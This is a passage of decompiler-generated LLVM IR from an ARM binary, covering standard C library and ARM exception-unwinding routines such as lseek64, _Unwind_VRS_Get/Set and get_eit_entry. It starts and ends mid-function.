  store i32 %v3_17940, i32* %stack_var_-8, align 4
  %v0_17944 = load i32, i32* @r0, align 4
  store i32 %v0_17944, i32* %r4.global-to-local, align 4
  br i1 %v2_1793c, label %dec_label_pc_17968, label %dec_label_pc_1794c

dec_label_pc_1794c:                               ; preds = %entry
  %v1_17954 = add i32 %v0_17944, 260
  %v4_17958 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_17954)
  %v2_1795c = icmp eq i32 %v4_17958, 0
  br i1 %v2_1795c, label %dec_label_pc_1796c, label %dec_label_pc_17968

dec_label_pc_17968:                               ; preds = %dec_label_pc_1794c, %entry
  br label %dec_label_pc_1796c

dec_label_pc_1796c:                               ; preds = %dec_label_pc_1794c, %dec_label_pc_17968
  %storemerge = phi i32 [ 0, %dec_label_pc_17968 ], [ 1, %dec_label_pc_1794c ]
  %v1_17970 = load i32, i32* %r4.global-to-local, align 4
  %v2_17970 = add i32 %v1_17970, 256
  %v3_17970 = inttoptr i32 %v2_17970 to i32*
  store i32 %storemerge, i32* %v3_17970, align 4
  %v2_17974 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17974, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 9, 0, 5, 6, 1, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 3, 21, 4, 22, 23, 24 }
  uselistorder i32 260, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1796c, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_179c4, label %dec_label_pc_179a8

dec_label_pc_179a8:                               ; preds = %entry
  %v0_179ac = call i32 @__aeabi_read_tp()
  %v3_179b0 = load i16, i16* @global_var_216f0.341, align 2
  %v4_179b0 = sext i16 %v3_179b0 to i32
  %v0_179b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_179b4 = sub i32 0, %v0_179b4
  store i32 %v1_179b4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_179bc = add i32 %v4_179b0, %v0_179ac
  %v4_179bc = inttoptr i32 %v3_179bc to i32*
  store i32 %v1_179b4, i32* %v4_179bc, align 4
  %v0_179cc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_179cc

dec_label_pc_179c4:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_179c4 = icmp eq i32 %arg1, 0
  br i1 %v2_179c4, label %dec_label_pc_179d8, label %dec_label_pc_179cc

dec_label_pc_179cc:                               ; preds = %dec_label_pc_179c4, %dec_label_pc_179a8
  %v0_179cc = phi i32 [ %arg1, %dec_label_pc_179c4 ], [ %v0_179cc.pre, %dec_label_pc_179a8 ]
  %v3_179d0 = ashr i32 %v0_179cc, 31
  br label %dec_label_pc_179dc

dec_label_pc_179d8:                               ; preds = %dec_label_pc_179c4
  br label %dec_label_pc_179dc

dec_label_pc_179dc:                               ; preds = %dec_label_pc_179cc, %dec_label_pc_179d8
  %v1_179e4 = phi i32 [ %v0_179cc, %dec_label_pc_179cc ], [ %tmp8, %dec_label_pc_179d8 ]
  %storemerge = phi i32 [ %v3_179d0, %dec_label_pc_179cc ], [ %tmp, %dec_label_pc_179d8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_179e4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 3, 1, 2, 4, 5, 0 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_216f0.341, { 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 64, 70, 69, 63, 62, 79, 78, 67, 68, 66, 65, 77, 76, 75, 74, 73, 72, 71, 17, 25, 27, 34, 61, 43, 42, 12, 6, 5, 11, 24, 23, 10, 3, 2, 13, 9, 8, 7, 47, 16, 22, 46, 45, 26, 19, 21, 20, 58, 57, 14, 32, 31, 30, 33, 56, 55, 54, 53, 29, 28, 18, 60, 59, 41, 38, 37, 36, 44, 4, 52, 51, 35, 50, 15, 49, 48, 0, 1, 40, 39 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_179dc, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_179ec = icmp eq i32 %regclass, 0
  br i1 %v2_179ec, label %dec_label_pc_179f4, label %dec_label_pc_17a24

dec_label_pc_179f4:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_179f4
  %v6_179f8 = icmp eq i32 %representation, 0
  br i1 %v6_179f8, label %dec_label_pc_17a08, label %bb8

.thread3:                                         ; preds = %dec_label_pc_179f4
  br label %dec_label_pc_17a30

bb8:                                              ; preds = %bb
  br label %dec_label_pc_17a30

dec_label_pc_17a08:                               ; preds = %bb
  %v3_17a08 = mul i32 %regno, 4
  %v2_17a0c = add i32 %v3_17a08, %context
  %v1_17a10 = add i32 %v2_17a0c, 4
  %v2_17a10 = inttoptr i32 %v1_17a10 to i32*
  %v3_17a10 = load i32, i32* %v2_17a10, align 4
  %v2_17a1c = bitcast i8* %valuep to i32*
  store i32 %v3_17a10, i32* %v2_17a1c, align 4
  ret i32 0

dec_label_pc_17a24:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_17a24
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17a24, %bb9
  %v0_17a2c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_17a2c)
  br label %dec_label_pc_17a30

dec_label_pc_17a30:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_17a30, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_17a38 = icmp eq i32 %regclass, 0
  br i1 %v2_17a38, label %dec_label_pc_17a40, label %dec_label_pc_17a70

dec_label_pc_17a40:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17a40
  %v6_17a44 = icmp eq i32 %representation, 0
  br i1 %v6_17a44, label %dec_label_pc_17a54, label %bb8

.thread3:                                         ; preds = %dec_label_pc_17a40
  br label %dec_label_pc_17a7c

bb8:                                              ; preds = %bb
  br label %dec_label_pc_17a7c

dec_label_pc_17a54:                               ; preds = %bb
  %v3_17a58 = mul i32 %regno, 4
  %v1_17a5c = bitcast i8* %valuep to i32*
  %v2_17a5c = load i32, i32* %v1_17a5c, align 4
  %v2_17a60 = add i32 %v3_17a58, %context
  %v2_17a68 = add i32 %v2_17a60, 4
  %v3_17a68 = inttoptr i32 %v2_17a68 to i32*
  store i32 %v2_17a5c, i32* %v3_17a68, align 4
  ret i32 0

dec_label_pc_17a70:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_17a70
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17a70, %bb9
  %v0_17a78 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_17a78)
  br label %dec_label_pc_17a7c

dec_label_pc_17a7c:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_17a7c, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_17a84 = add i32 %context, 68
  %v2_17a84 = inttoptr i32 %v1_17a84 to i32*
  %v3_17a84 = load i32, i32* %v2_17a84, align 4
  ret i32 %v3_17a84

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_17a94 = add i32 %exc, 8
  %v2_17a94 = inttoptr i32 %v1_17a94 to i32*
  %v3_17a94 = load i32, i32* %v2_17a94, align 4
  %v2_17a98 = icmp eq i32 %v3_17a94, 0
  br i1 %v2_17a98, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_17aac = xor i1 %v2_17a98, true
  call void @__pseudo_cond_branch(i1 %v2_17aac, i32 %v3_17a94)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_17ac4 = call i32 @abort()
  ret i32 %v0_17ac4
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_17ad0 = call i32 @abort()
  ret i32 %v0_17ad0
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_17ad4 = load i32, i32* @r4, align 4
  store i32 %v3_17ad4, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r5.global-to-local, align 4
  %v4_17ae4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 132) to i32*), align 4
  %v2_17ae8 = icmp eq i32 %v4_17ae4, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_17af4 = add i32 %return_address, -2
  store i32 %v1_17af4, i32* %r4.global-to-local, align 4
  br i1 %v2_17ae8, label %dec_label_pc_17b2c, label %dec_label_pc_17afc

dec_label_pc_17afc:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_17ae4)
  %v2_17b0c = icmp eq i32 %v1_17af4, 0
  br i1 %v2_17b0c, label %.thread, label %dec_label_pc_17b4cthread-pre-split

.thread:                                          ; preds = %dec_label_pc_17afc
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_17b14 = load i32, i32* %r6.global-to-local, align 4
  %v3_17b14 = add i32 %v2_17b14, 16
  %v4_17b14 = inttoptr i32 %v3_17b14 to i32*
  store i32 0, i32* %v4_17b14, align 4
  br label %dec_label_pc_17b1c

dec_label_pc_17b1c:                               ; preds = %.thread, %.thread10, %dec_label_pc_17cc4, %dec_label_pc_17cb0, %dec_label_pc_17c8c, %dec_label_pc_17c64, %dec_label_pc_17b64
  %v0_17b1c = load i32, i32* %r2.global-to-local, align 4
  %v2_17b24 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_17b24, i32* @r4, align 4
  ret i32 %v0_17b1c

dec_label_pc_17b2c:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_17b34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 20) to i32*), align 4
  %v4_17b38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 48) to i32*), align 4
  store i32 %v4_17b38, i32* %r2.global-to-local, align 4
  %v2_17b3c = sub i32 %v4_17b34, %v4_17b38
  %v3_17b40 = sdiv i32 %v2_17b3c, 8
  store i32 %v3_17b40, i32* %stack_var_-36, align 4
  br label %dec_label_pc_17b4c

dec_label_pc_17b4cthread-pre-split:               ; preds = %dec_label_pc_17afc
  %v3_17b4c.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_17b4c

dec_label_pc_17b4c:                               ; preds = %dec_label_pc_17b4cthread-pre-split, %dec_label_pc_17b2c
  %v0_17b90.pre = phi i32 [ %v1_17af4, %dec_label_pc_17b4cthread-pre-split ], [ %v4_17b38, %dec_label_pc_17b2c ]
  %v1_17b54 = phi i32 [ %v3_17b4c.pr, %dec_label_pc_17b4cthread-pre-split ], [ %v3_17b40, %dec_label_pc_17b2c ]
  %v2_17b50 = icmp eq i32 %v1_17b54, 0
  br i1 %v2_17b50, label %dec_label_pc_17b64, label %dec_label_pc_17b80.preheader

dec_label_pc_17b80.preheader:                     ; preds = %dec_label_pc_17b4c
  %v2_17b54 = add i32 %v1_17b54, -1
  %v1_17bb0 = add i32 %v0_17b90.pre, 8
  br label %dec_label_pc_17b80.outer

dec_label_pc_17b64.loopexit:                      ; preds = %dec_label_pc_17bdc
  br label %dec_label_pc_17b64

dec_label_pc_17b64:                               ; preds = %dec_label_pc_17b64.loopexit, %dec_label_pc_17b4c, %dec_label_pc_17ca8
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_17b6c = load i32, i32* %r6.global-to-local, align 4
  %v2_17b6c = add i32 %v1_17b6c, 16
  %v3_17b6c = inttoptr i32 %v2_17b6c to i32*
  store i32 0, i32* %v3_17b6c, align 4
  br label %dec_label_pc_17b1c

dec_label_pc_17b74:                               ; preds = %dec_label_pc_17bd0
  %v3_17b74 = icmp ult i32 %storemerge40, %v0_17bd4
  br i1 %v3_17b74, label %dec_label_pc_17b7c, label %dec_label_pc_17bec

dec_label_pc_17b7c:                               ; preds = %dec_label_pc_17b74
  %v1_17b7c = add nsw i32 %v3_17b88, 1
  br label %dec_label_pc_17b80.outer

dec_label_pc_17b80.outer:                         ; preds = %dec_label_pc_17b7c, %dec_label_pc_17b80.preheader
  %v1_17bdc.ph = phi i32 [ %v1_17b7c, %dec_label_pc_17b7c ], [ 0, %dec_label_pc_17b80.preheader ]
  %v0_17b80.ph = phi i32 [ %v0_17b80, %dec_label_pc_17b7c ], [ %v2_17b54, %dec_label_pc_17b80.preheader ]
  br label %dec_label_pc_17b80

dec_label_pc_17b80:                               ; preds = %dec_label_pc_17b80.outer, %dec_label_pc_17be4
  %v0_17b80 = phi i32 [ %v1_17be4, %dec_label_pc_17be4 ], [ %v0_17b80.ph, %dec_label_pc_17b80.outer ]
  %v2_17b80 = add i32 %v0_17b80, %v1_17bdc.ph
  %tmp = icmp slt i32 %v2_17b80, 0
  %v4_17b84 = zext i1 %tmp to i32
  %v5_17b84 = add i32 %v4_17b84, %v2_17b80
  %v3_17b88 = sdiv i32 %v5_17b84, 2
  %v3_17b8c = mul i32 %v3_17b88, 8
  store i32 %v3_17b8c, i32* @ip, align 4
  %v2_17b90 = add i32 %v3_17b8c, %v0_17b90.pre
  %v3_17b90 = inttoptr i32 %v2_17b90 to i32*
  %v4_17b90 = load i32, i32* %v3_17b90, align 4
  %v1_17b94 = and i32 %v4_17b90, 1073741824
  %v2_17b94 = icmp eq i32 %v1_17b94, 0
  %v2_17b98 = or i32 %v4_17b90, -2147483648
  %tmp79 = bitcast i32 %v4_17b90 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_17b9c = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_17b94, i32 %v2_17b9c, i32 %v2_17b98
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_17ba0 = icmp eq i32 %v2_17b54, %v3_17b88
  store i32 %v2_17b90, i32* %r7.global-to-local, align 4
  br i1 %v9_17ba0, label %dec_label_pc_17bd0, label %dec_label_pc_17bb0

dec_label_pc_17bb0:                               ; preds = %dec_label_pc_17b80
  %v2_17bb4 = add i32 %v3_17b8c, %v1_17bb0
  %v3_17bb4 = inttoptr i32 %v2_17bb4 to i32*
  %v4_17bb4 = load i32, i32* %v3_17bb4, align 4
  %v1_17bbc = and i32 %v4_17bb4, 1073741824
  %v2_17bbc = icmp eq i32 %v1_17bbc, 0
  %v2_17bc0 = or i32 %v4_17bb4, -2147483648
  %tmp81 = bitcast i32 %v4_17bb4 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_17bc4 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_17bbc, i32 %v2_17bc4, i32 %v2_17bc0
  %v1_17bc8 = add i32 %v2_17bb4, -1
  %v2_17bcc = add i32 %storemerge39, %v1_17bc8
  br label %dec_label_pc_17bd0

dec_label_pc_17bd0:                               ; preds = %dec_label_pc_17b80, %dec_label_pc_17bb0
  %storemerge40 = phi i32 [ %v2_17bcc, %dec_label_pc_17bb0 ], [ -1, %dec_label_pc_17b80 ]
  %v2_17bd0 = add i32 %storemerge, %v2_17b90
  %v0_17bd4 = load i32, i32* %r4.global-to-local, align 4
  %v3_17bd4 = icmp ult i32 %v0_17bd4, %v2_17bd0
  br i1 %v3_17bd4, label %dec_label_pc_17bdc, label %dec_label_pc_17b74

dec_label_pc_17bdc:                               ; preds = %dec_label_pc_17bd0
  %v9_17bdc = icmp eq i32 %v3_17b88, %v1_17bdc.ph
  br i1 %v9_17bdc, label %dec_label_pc_17b64.loopexit, label %dec_label_pc_17be4

dec_label_pc_17be4:                               ; preds = %dec_label_pc_17bdc
  %v1_17be4 = add nsw i32 %v3_17b88, -1
  br label %dec_label_pc_17b80

dec_label_pc_17bec:                               ; preds = %dec_label_pc_17b74
  %v2_17bec = load i32, i32* %v3_17b90, align 4
  %v1_17bf0 = and i32 %v2_17bec, 1073741824
  %v2_17bf0 = icmp eq i32 %v1_17bf0, 0
  %v2_17bf4 = or i32 %v2_17bec, -2147483648
  %tmp83 = bitcast i32 %v2_17bec to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_17bf8 = bitcast float %tmp84 to i32
  %v0_17bfc = select i1 %v2_17bf0, i32 %v2_17bf8, i32 %v2_17bf4
  %v2_17bfc = add i32 %v0_17bfc, %v2_17b90
  %v1_17c00 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c00 = add i32 %v1_17c00, 72
  %v3_17c00 = inttoptr i32 %v2_17c00 to i32*
  store i32 %v2_17bfc, i32* %v3_17c00, align 4
  %v0_17c04 = load i32, i32* %r7.global-to-local, align 4
  %v1_17c04 = add i32 %v0_17c04, 4
  %v2_17c04 = inttoptr i32 %v1_17c04 to i32*
  %v3_17c04 = load i32, i32* %v2_17c04, align 4
  %v7_17c08 = icmp eq i32 %v3_17c04, 1
  br i1 %v7_17c08, label %.thread10, label %dec_label_pc_17c1c

.thread10:                                        ; preds = %dec_label_pc_17bec
  %v1_17c08 = add i32 %v3_17c04, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_17c14 = load i32, i32* %r6.global-to-local, align 4
  %v3_17c14 = add i32 %v2_17c14, 16
  %v4_17c14 = inttoptr i32 %v3_17c14 to i32*
  store i32 %v1_17c08, i32* %v4_17c14, align 4
  br label %dec_label_pc_17b1c

dec_label_pc_17c1c:                               ; preds = %dec_label_pc_17bec
  %v1_17c1c = icmp slt i32 %v3_17c04, 0
  br i1 %v1_17c1c, label %.thread38, label %dec_label_pc_17c34

.thread38:                                        ; preds = %dec_label_pc_17c1c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_17c28 = load i32, i32* %r6.global-to-local, align 4
  %v5_17c28 = add i32 %v4_17c28, 76
  %v6_17c28 = inttoptr i32 %v5_17c28 to i32*
  store i32 %v1_17c04, i32* %v6_17c28, align 4
  %v3_17c2c = load i32, i32* %r2.global-to-local, align 4
  %v4_17c2c = load i32, i32* %r6.global-to-local, align 4
  %v5_17c2c = add i32 %v4_17c2c, 80
  %v6_17c2c = inttoptr i32 %v5_17c2c to i32*
  store i32 %v3_17c2c, i32* %v6_17c2c, align 4
  br label %dec_label_pc_17c54

dec_label_pc_17c34:                               ; preds = %dec_label_pc_17c1c
  %v1_17c34 = and i32 %v3_17c04, 1073741824
  %v2_17c34 = icmp eq i32 %v1_17c34, 0
  %v2_17c38 = or i32 %v3_17c04, -2147483648
  %tmp85 = bitcast i32 %v3_17c04 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_17c3c = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_17c34, i32 %v2_17c3c, i32 %v2_17c38
  %v1_17c40 = add i32 %storemerge42, 4
  %v2_17c44 = add i32 %v1_17c40, %v0_17c04
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_17c4c = load i32, i32* %r6.global-to-local, align 4
  %v2_17c4c = add i32 %v1_17c4c, 76
  %v3_17c4c = inttoptr i32 %v2_17c4c to i32*
  store i32 %v2_17c44, i32* %v3_17c4c, align 4
  %v0_17c50 = load i32, i32* %r2.global-to-local, align 4
  %v1_17c50 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c50 = add i32 %v1_17c50, 80
  %v3_17c50 = inttoptr i32 %v2_17c50 to i32*
  store i32 %v0_17c50, i32* %v3_17c50, align 4
  br label %dec_label_pc_17c54

dec_label_pc_17c54:                               ; preds = %.thread38, %dec_label_pc_17c34
  %v0_17c54 = load i32, i32* %r6.global-to-local, align 4
  %v1_17c54 = add i32 %v0_17c54, 76
  %v2_17c54 = inttoptr i32 %v1_17c54 to i32*
  %v3_17c54 = load i32, i32* %v2_17c54, align 4
  store i32 %v3_17c54, i32* %r2.global-to-local, align 4
  %v1_17c58 = inttoptr i32 %v3_17c54 to i32*
  %v2_17c58 = load i32, i32* %v1_17c58, align 4
  %v1_17c5c = icmp slt i32 %v2_17c58, 0
  br i1 %v1_17c5c, label %dec_label_pc_17c80, label %dec_label_pc_17c64

dec_label_pc_17c64:                               ; preds = %dec_label_pc_17c54
  %v1_17c64 = and i32 %v2_17c58, 1073741824
  %v2_17c64 = icmp eq i32 %v1_17c64, 0
  %v2_17c68 = or i32 %v2_17c58, -2147483648
  %tmp87 = bitcast i32 %v2_17c58 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_17c6c = bitcast float %tmp88 to i32
  %v0_17c70 = select i1 %v2_17c64, i32 %v2_17c6c, i32 %v2_17c68
  %v2_17c70 = add i32 %v0_17c70, %v3_17c54
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_17c78 = add i32 %v0_17c54, 16
  %v3_17c78 = inttoptr i32 %v2_17c78 to i32*
  store i32 %v2_17c70, i32* %v3_17c78, align 4
  br label %dec_label_pc_17b1c

dec_label_pc_17c80:                               ; preds = %dec_label_pc_17c54
  %v3_17c80 = udiv i32 %v2_17c58, 16777216
  %v1_17c84 = urem i32 %v3_17c80, 16
  %v2_17c84 = icmp eq i32 %v1_17c84, 0
  br i1 %v2_17c84, label %dec_label_pc_17c8c, label %dec_label_pc_17ca0

dec_label_pc_17c8c:                               ; preds = %dec_label_pc_17c80
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17c94 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c94 = add i32 %v0_17c94, -36856
  %v2_17c98 = add i32 %v0_17c54, 16
  %v3_17c98 = inttoptr i32 %v2_17c98 to i32*
  store i32 %v2_17c94, i32* %v3_17c98, align 4
  br label %dec_label_pc_17b1c

dec_label_pc_17ca0:                               ; preds = %dec_label_pc_17c80
  %v7_17ca0 = icmp eq i32 %v1_17c84, 1
  br i1 %v7_17ca0, label %dec_label_pc_17cc4, label %dec_label_pc_17ca8

dec_label_pc_17ca8:                               ; preds = %dec_label_pc_17ca0
  %v7_17ca8 = icmp eq i32 %v1_17c84, 2
  br i1 %v7_17ca8, label %dec_label_pc_17cb0, label %dec_label_pc_17b64

dec_label_pc_17cb0:                               ; preds = %dec_label_pc_17ca8
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17cb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_17cb8 = add i32 %v0_17cb8, -36872
  %v2_17cbc = add i32 %v0_17c54, 16
  %v3_17cbc = inttoptr i32 %v2_17cbc to i32*
  store i32 %v2_17cb8, i32* %v3_17cbc, align 4
  br label %dec_label_pc_17b1c

dec_label_pc_17cc4:                               ; preds = %dec_label_pc_17ca0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17ccc = load i32, i32* %r5.global-to-local, align 4
  %v2_17ccc = add i32 %v0_17ccc, -36864
  %v2_17cd0 = add i32 %v0_17c54, 16
  %v3_17cd0 = inttoptr i32 %v2_17cd0 to i32*
  store i32 %v2_17ccc, i32* %v3_17cd0, align 4
  br label %dec_label_pc_17b1c

; uselistorder directives
  uselistorder i32 %v1_17c84, { 2, 1, 0 }
  uselistorder i32 %v0_17c54, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_17c04, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_17bd4, { 1, 0 }
  uselistorder i32 %v3_17b8c, { 2, 1, 0 }
  uselistorder i32 %v3_17b88, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_17b80, { 1, 0 }
  uselistorder i32 %v0_17b80, { 1, 0 }
  uselistorder i32 %v2_17b54, { 1, 0 }
  uselistorder i32 %v0_17b90.pre, { 1, 0 }
  uselistorder i32 %v3_17b40, { 1, 0 }
  uselistorder i32 %v1_17af4, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_17c54, { 1, 0 }
  uselistorder label %dec_label_pc_17bd0, { 1, 0 }
  uselistorder label %dec_label_pc_17b80, { 1, 0 }
  uselistorder label %dec_label_pc_17b64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17b1c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_17cdc(i32 %arg1) local_unnamed_addr {
dec_label_pc_17cdc:
  %v0_17cdc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17cdc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17cdc
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17cdc, %bb
  %v10_17ce4 = phi i32 [ %arg1, %dec_label_pc_17cdc ], [ 0, %bb ]
  ret i32 %v10_17ce4

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_17cf8 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_17d0c = inttoptr i32 %v1_17cf8 to i32*
  %v2_17d0c = load i32, i32* %v1_17d0c, align 4
  store i32 %v2_17d0c, i32* %r0.global-to-local, align 4
  %v12_17d0c = add i32 %entry_vrs, 20
  %v1_17d18 = inttoptr i32 %v12_17d0c to i32*
  %v2_17d18 = load i32, i32* %v1_17d18, align 4
  store i32 %v2_17d18, i32* %r0.global-to-local, align 4
  %v12_17d18 = add i32 %entry_vrs, 36
  %v1_17d20 = inttoptr i32 %v12_17d18 to i32*
  %v2_17d20 = load i32, i32* %v1_17d20, align 4
  store i32 %v2_17d20, i32* %r0.global-to-local, align 4
  %v12_17d20 = add i32 %entry_vrs, 52
  store i32 %v12_17d20, i32* @ip, align 4
  %v13_17d24 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_17d24, i32* @lr, align 4
  %v1_17d28 = inttoptr i32 %v12_17d20 to i32*
  %v2_17d28 = load i32, i32* %v1_17d28, align 4
  store i32 %v2_17d28, i32* %r0.global-to-local, align 4
  %v9_17d28 = add i32 %entry_vrs, 64
  %v10_17d28 = inttoptr i32 %v9_17d28 to i32*
  %v11_17d28 = load i32, i32* %v10_17d28, align 4
  store i32 0, i32* @r4, align 4
  %v1_17d30 = add i32 %ucbp, 12
  %v2_17d30 = inttoptr i32 %v1_17d30 to i32*
  %v3_17d30 = load i32, i32* %v2_17d30, align 4
  store i32 %v2_17d28, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_17d48 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_17d28)
  store i32 %v2_17d48, i32* %r0.global-to-local, align 4
  %v0_17d4c = load i32, i32* @r6, align 4
